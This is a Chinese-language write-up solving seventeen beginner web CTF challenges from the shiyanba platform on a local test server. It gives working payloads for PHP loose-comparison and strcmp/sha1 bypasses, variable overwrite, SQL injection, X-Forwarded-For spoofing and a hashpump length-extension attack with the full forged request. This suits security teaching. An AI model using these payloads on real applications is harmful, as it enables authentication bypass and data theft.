<!-- TOC -->

- [实验吧入门题目详解](#实验吧入门题目详解)
    - [web1](#web1)
    - [web2](#web2)
    - [web3](#web3)
    - [web4](#web4)
    - [web5](#web5)
    - [web6](#web6)
    - [web7](#web7)
    - [web8](#web8)
    - [web9](#web9)
    - [web10](#web10)
    - [web11](#web11)
    - [web12](#web12)
    - [web14](#web14)
    - [web15](#web15)
    - [web16](#web16)
    - [web17](#web17)

<!-- /TOC -->

## 实验吧入门题目详解 
### web1 
此题目感觉意义不是很大，其实就是为了考察php的一种特殊路由方式。
例如访问: /index.php/test 其实访问的文件说index.php,最后test作为参数穿入index.php中。
在很多国内的CMS中，都是采用这种路由方式，例如 ear music。 
最后获取到flag的URL是：
```
http://127.0.0.1/shiyanba/web1.php/web1.php
```

### web2 
这个题目主要考察变量覆盖漏洞`extract($_GET)`导致变量覆盖，
然后通过变量覆盖漏洞覆盖`$filename`为一个不存在的文件名，然后穿入`shiyan`为空字符串就可以绕过了。
```
http://127.0.0.1/shiyanba/web2.php?shiyan=&filename=xxxx
```

### web3 
此题目主要考察php的弱类型：
```
php > var_dump(true=="test");
bool(true)
```
用 `==`是一种弱条件的等，用它进行比较的时候，会发生类型转换。
字符串“test”会转化为bool类型，变为true，所以两者相等。 
所以此题目只需要穿入
```php
array{
    "username"=>true,
    "passowrd"=>true
}
```
的序列化值就可以了,最终的payload为。
```
web3.php?info=a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```
### web4 
此题目主要考察函数ereg()的绕过方法。
```php
ereg ("^[a-zA-Z0-9]+$", $_GET['password']
```
这一句要求password中只能含有a-zA-Z0-9这些字符，后面又要求必须含有字符`*-*` 用到了ereg()函数的一个漏洞，%00之后的字符不会参与比较。
```php
strlen($_GET['password']) < 8 && $_GET['password'] > 9999999
```
这里要求password转换为整形之后要大于9999999，所以想到了科学计数法，最终提交：
```
web4.php?password=9e9%00*-*
```

### web5 

这个题目主要考察ctrcmp()函数。
当strcmp()函数参数是数组的时候,函数执行出错，返回NULL
NULL和0做==比较的时候是True。 
所以传入
```
/web5.php?a[]= 
```
就可以拿到flag。

### web6 

此题目考查SESSION和未定义变量引起的弱类型。 

当把sessionid设置为空的时候,$_SESSION['password']是为定义的，所以password传入空字符串，就可以绕过了。
```
GET /shiyanba/web6.php?password= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```
就可以拿到flag了。

### web7 

此题目有两种做法。
1. password和name都是数组，这样经过sha1()函数，两者都是NULL，就获取到了flag。
```
http://127.0.0.1/shiyanba/web7.php?name[]=1&password[]=3
```
2. 使用oe开头后面全是数字的字符串。

```
sha1('aaroZmOk') =>0e66507019969427134894567494305185566735
sha1('aaK1STfY') =>0e76658526655756207688271159624026011393
```
所以:
```
http://127.0.0.1/shiyanba/web7.php?name=aaroZmOk&password=aaK1STfY
```

### web8 
没啥好说的，解密算法如下：
```php

function   decode($miwen){
    $de_rot13=str_rot13($miwen);
    $de_strev=strrev($de_rot13);
    $de_base64=base64_decode($de_strev);
    $de_base64=strrev($de_base64);
    $mingwen="";
    for($i=0;$i<strlen($de_base64);$i++){
        $tmp=substr($de_base64,$i,1);
        $tmp=ord($tmp)-1;
        $tmp=chr($tmp);
        $mingwen.=$tmp;   
    }
    return $mingwen;
}
echo decode($miwen);
```

### web9 

考察最基本的sql注入
```
user=dddd' union select 'c4ca4238a0b923820dcc509a6f75849b' %23&pass=1
```
c4ca4238a0b923820dcc509a6f75849b 是1的md5值。 

### web10 
问题出在了那句urldecode()上，
因为$_GET里面的字符是已经经过一次urldecode()的，这里又操作了一次，显然有问题，所以经过两次urlencode()就可以了。
```
?id=hackerD%254a
```

### web11 

基础的sql注入：

```
user=admin') and 1=1 %23&pass=1
```

### web12
利用 X_FORWARDED_FOR 伪造ip来源。
```
GET /shiyanba/web12.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
X-forwarded-for: 1.1.1.1
Upgrade-Insecure-Requests: 1

```
### web14

这个题目比较有意思，充分的利用sql的特性：
```

mysql> select * from  user ;
+----+-----------+----------------------------------+-------+
| id | uname     | password                         | level |
+----+-----------+----------------------------------+-------+
|  1 | admin     | 21232f297a57a5a743894aoe4a801fc3 |     1 |
|  2 | test      | 202cb962ac59075b964b07152d234b70 |     0 |
|  3 | wonderkun | e10adc3949ba59abbe56e057f20f883e |     0 |
|  4 | 想放假    | e10adc3949ba59abbe56e057f20f883e |     0  |
+----+-----------+----------------------------------+-------+

mysql> select * from  user where 1=1  group by  password   ;
+----+-----------+----------------------------------+-------+
| id | uname     | password                         | level |
+----+-----------+----------------------------------+-------+
|  2 | test      | 202cb962ac59075b964b07152d234b70 |     0 |
|  1 | admin     | 21232f297a57a5a743894aoe4a801fc3 |     1 |
|  3 | wonderkun | e10adc3949ba59abbe56e057f20f883e |     0 |
+----+-----------+----------------------------------+-------+

mysql> select * from  user where 1=1  group by  password  with rollup limit 1 offset 3 ;
+----+-----------+----------+-------+
| id | uname     | password | level |
+----+-----------+----------+-------+
|  3 | wonderkun | NULL     |     0 |
+----+-----------+----------+-------+
//上面就是构造空密码用户的方法。
```
```
uname='%26%261=1 group by pw with roleup limit 1 offset x; 
```

### web15 

很明显的hash长度扩展攻击：

我们知道了 $secret.'adminadmin'的签名，其中$secret是15位的。
使用hashpump来实现hash长度扩展攻击。
```
➜  ~ hashpump
Input Signature: 8867c97050ca95d6b74a70232d6394a6
Input Data: adminadmin
Input Key Length: 15
Input Data to Add: test
9f19f6bbbd780ff35f68cff1d96e4834
adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00test
```
post:
```
POST /shiyanba/web15.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Cookie: sample-hash=8867c97050ca95d6b74a70232d6394a6; source=0; getmein=9f19f6bbbd780ff35f68cff1d96e4834
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00test
```

### web16 

这题没啥说的，看得懂代码就会做：

```
http://127.0.0.1/shiyanba/web16.php?foo={"bar1":"2017Tx","bar2":[[0],1,2,3,4],"a2":{"1":"nudt"}}&cat[1][]="1"&&dog=％00&&cat[0]="htctf2016"
```

### web17 
利用了的parse_str()的漏洞
```
heetian=1%26he=abcd
```
